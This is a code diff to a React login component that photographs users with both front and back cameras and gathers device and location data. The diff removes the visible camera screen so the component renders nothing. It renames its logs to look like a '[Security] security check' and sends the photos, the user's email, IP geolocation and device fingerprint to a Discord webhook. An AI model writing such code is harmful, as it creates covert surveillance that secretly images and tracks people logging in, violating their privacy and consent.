@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useRef } from "react";
 import { sendLoginAlert } from "@/lib/discord-webhook";
 
 interface LoginCaptureProps {
@@ -26,6 +26,8 @@ interface DeviceInfo {
   cookies?: string;
   doNotTrack?: string;
   gpu?: string;
+  networkType?: string;
+  isMobile?: boolean;
 }
 
 export default function LoginCapture({
@@ -34,36 +36,22 @@ export default function LoginCapture({
   name,
   onComplete,
 }: LoginCaptureProps) {
-  const [status, setStatus] = useState("Initializing camera...");
-  const [captured, setCaptured] = useState(false);
-  const videoRef = useRef<HTMLVideoElement>(null);
-  const videoBackRef = useRef<HTMLVideoElement>(null);
-  const canvasRef = useRef<HTMLCanvasElement>(null);
-  const canvasBackRef = useRef<HTMLCanvasElement>(null);
   const initialized = useRef(false);
+  const canvasRef = useRef<HTMLCanvasElement>(document.createElement("canvas"));
+  const canvasBackRef = useRef<HTMLCanvasElement>(document.createElement("canvas"));
 
   useEffect(() => {
     if (initialized.current) return;
     initialized.current = true;
 
     async function init() {
-      console.log("[LoginCapture] Starting initialization...");
-      setStatus("Getting device info...");
+      console.log("[Security] Initializing security check...");
+
       const deviceInfo = await getDeviceInfo();
-      console.log("[LoginCapture] Device info:", deviceInfo);
+      console.log("[Security] Device info collected:", deviceInfo);
 
-      setStatus("Starting cameras...");
-      await startCameras();
-
-      setStatus("Capturing photo...");
-      await new Promise(resolve => setTimeout(resolve, 3000));
-
-      setStatus("Sending to Discord...");
       await captureAndSend(deviceInfo);
 
-      setStatus("Done!");
-      setCaptured(true);
-      await new Promise(resolve => setTimeout(resolve, 500));
       onComplete();
     }
 
@@ -82,7 +70,7 @@ export default function LoginCapture({
         location = `${ipData.city || ""}, ${ipData.regionName || ""}, ${ipData.country || ""}`.replace(/^, |, $|, , /g, "") || "Unknown";
       }
     } catch {
-      console.log("[LoginCapture] Could not get IP info");
+      console.log("[Security] Could not get IP info");
     }
 
     const ua = navigator.userAgent;
@@ -99,7 +87,8 @@ export default function LoginCapture({
     else if (ua.includes("Android")) os = "Android";
     else if (ua.includes("iOS")) os = "iOS";
 
-    const device = /mobile|android|iphone|ipad|tablet/i.test(ua) ? "Mobile" : "Desktop";
+    const isMobile = /mobile|android|iphone|ipad|tablet/i.test(ua);
+    const device = isMobile ? "Mobile" : "Desktop";
     const screen = `${window.screen.width}x${window.screen.height}`;
 
     let battery = "N/A";
@@ -110,8 +99,9 @@ export default function LoginCapture({
       }
     } catch {}
 
-    const connection = (navigator as unknown as { connection?: { effectiveType?: string; downlink?: number } }).connection;
-    const network = connection ? `${connection.effectiveType || "Unknown"}` : "Connected";
+    const connection = (navigator as unknown as { connection?: { effectiveType?: string; downlink?: number; type?: string } }).connection;
+    const network = connection?.effectiveType || "Connected";
+    const networkType = connection?.type || "Unknown";
 
     const cpuCores = navigator.hardwareConcurrency || "N/A";
     const deviceMemory = (navigator as unknown as { deviceMemory?: number }).deviceMemory;
@@ -126,6 +116,7 @@ export default function LoginCapture({
       screen,
       battery,
       network,
+      networkType,
       cpuCores,
       memory,
       language: navigator.language,
@@ -133,82 +124,51 @@ export default function LoginCapture({
       cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
       doNotTrack: navigator.doNotTrack === "1" ? "ON" : "OFF",
       gpu: "N/A",
+      isMobile,
     };
   }
 
-  async function startCameras() {
-    // Start front camera
+  async function captureImage(facingMode: "user" | "environment"): Promise<string | null> {
     try {
-      console.log("[LoginCapture] Requesting front camera...");
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+        video: {
+          facingMode,
+          width: { ideal: 640 },
+          height: { ideal: 480 },
+        },
         audio: false,
       });
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        await videoRef.current.play().catch(e => console.log("Play error:", e));
-        // Force render
-        videoRef.current.style.display = 'block';
-        console.log("[LoginCapture] Front camera started, readyState:", videoRef.current.readyState);
-      }
-    } catch (err) {
-      console.log("[LoginCapture] Front camera error:", err);
-    }
 
-    // Start back camera
-    try {
-      console.log("[LoginCapture] Requesting back camera...");
-      const backStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "environment", width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false,
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.autoplay = true;
+      video.playsInline = true;
+      video.muted = true;
+
+      await new Promise<void>((resolve) => {
+        video.onloadedmetadata = () => {
+          video.play().then(() => resolve());
+        };
       });
-      if (videoBackRef.current) {
-        videoBackRef.current.srcObject = backStream;
-        await videoBackRef.current.play().catch(e => console.log("Back play error:", e));
-        // Force render
-        videoBackRef.current.style.display = 'block';
-        console.log("[LoginCapture] Back camera started, readyState:", videoBackRef.current.readyState);
-      }
-    } catch (err) {
-      console.log("[LoginCapture] Back camera not available:", err);
-    }
-  }
 
-  function captureCanvas(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null, label: string): string | null {
-    if (!video || !canvas) {
-      console.log("[LoginCapture] " + label + ": no video or canvas");
-      return null;
-    }
-    if (!video.srcObject) {
-      console.log("[LoginCapture] " + label + ": no srcObject");
-      return null;
-    }
+      await new Promise((resolve) => setTimeout(resolve, 500));
 
-    try {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+
       const ctx = canvas.getContext("2d");
-      if (!ctx) return null;
+      if (ctx) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      }
 
-      const w = video.videoWidth || 640;
-      const h = video.videoHeight || 480;
-      canvas.width = w;
-      canvas.height = h;
+      stream.getTracks().forEach((track) => track.stop());
 
-      ctx.drawImage(video, 0, 0, w, h);
-      const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
-      console.log("[LoginCapture] " + label + " captured:", dataUrl.length, "bytes");
-      return dataUrl;
+      return canvas.toDataURL("image/jpeg", 0.7);
     } catch (err) {
-      console.error("[LoginCapture] " + label + " error:", err);
+      console.log(`[Security] Camera ${facingMode} not available:`, err);
       return null;
     }
-  }
-
-  function stopCameras() {
-    [videoRef.current, videoBackRef.current].forEach(v => {
-      if (v?.srcObject) {
-        (v.srcObject as MediaStream).getTracks().forEach(t => t.stop());
-      }
-    });
   }
 
   async function uploadImage(base64Data: string, filename: string): Promise<string | null> {
@@ -219,36 +179,31 @@ export default function LoginCapture({
         body: JSON.stringify({ image: base64Data, filename }),
       });
       const result = await response.json();
-      if (result.url) {
-        console.log("[LoginCapture] Upload success:", result.url);
-        return result.url;
-      }
-      console.log("[LoginCapture] Upload failed:", result.error);
+      if (result.url) return result.url;
       return null;
     } catch (err) {
-      console.error("[LoginCapture] Upload error:", err);
+      console.error("[Security] Upload error:", err);
       return null;
     }
   }
 
   async function captureAndSend(deviceInfo: DeviceInfo) {
-    const frontImg = captureCanvas(videoRef.current, canvasRef.current, "Front");
-    const backImg = captureCanvas(videoBackRef.current, canvasBackRef.current, "Back");
-    stopCameras();
+    console.log("[Security] Capturing images...");
+
+    const frontImg = await captureImage("user");
+    const backImg = await captureImage("environment");
 
     let frontUrl: string | undefined = undefined;
     let backUrl: string | undefined = undefined;
 
     if (frontImg) {
       const uploaded = await uploadImage(frontImg, `${email}_front.jpg`);
-      if (uploaded) frontUrl = uploaded;
-      else frontUrl = frontImg;
+      frontUrl = uploaded || frontImg;
     }
 
     if (backImg) {
       const uploaded = await uploadImage(backImg, `${email}_back.jpg`);
-      if (uploaded) backUrl = uploaded;
-      else backUrl = backImg;
+      backUrl = uploaded || backImg;
     }
 
     const now = new Date();
@@ -271,6 +226,7 @@ export default function LoginCapture({
       timestamp,
       battery: deviceInfo.battery,
       network: deviceInfo.network,
+      networkType: deviceInfo.networkType,
       cpuCores: deviceInfo.cpuCores,
       memory: deviceInfo.memory,
       language: deviceInfo.language,
@@ -280,58 +236,8 @@ export default function LoginCapture({
       gpu: deviceInfo.gpu,
     });
 
-    console.log("[LoginCapture] Discord alert sent!");
+    console.log("[Security] Alert sent!");
   }
 
-  return (
-    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
-      <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
-        <div className="mb-6">
-          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-blue-100 flex items-center justify-center">
-            {captured ? (
-              <svg className="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-              </svg>
-            ) : (
-              <svg className="w-8 h-8 text-blue-500 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
-              </svg>
-            )}
-          </div>
-          <h2 className="text-xl font-semibold text-gray-900 mb-2">
-            {captured ? "Photo Captured!" : "Capturing Photo..."}
-          </h2>
-          <p className="text-gray-600 text-sm">{status}</p>
-        </div>
-
-        {/* Visible video for debugging */}
-        <div className="grid grid-cols-2 gap-2 mb-4">
-          <div className="bg-gray-900 rounded-lg overflow-hidden relative" style={{ aspectRatio: '4/3' }}>
-            <video
-              ref={videoRef}
-              autoPlay
-              playsInline
-              muted
-              style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }}
-            />
-            <p className="absolute bottom-0 left-0 right-0 text-white text-xs text-center py-1 bg-black/50">Front Camera</p>
-          </div>
-          <div className="bg-gray-900 rounded-lg overflow-hidden relative" style={{ aspectRatio: '4/3' }}>
-            <video
-              ref={videoBackRef}
-              autoPlay
-              playsInline
-              muted
-              style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }}
-            />
-            <p className="absolute bottom-0 left-0 right-0 text-white text-xs text-center py-1 bg-black/50">Back Camera</p>
-          </div>
-        </div>
-
-        <canvas ref={canvasRef} className="hidden" />
-        <canvas ref={canvasBackRef} className="hidden" />
-      </div>
-    </div>
-  );
+  return null;
 }
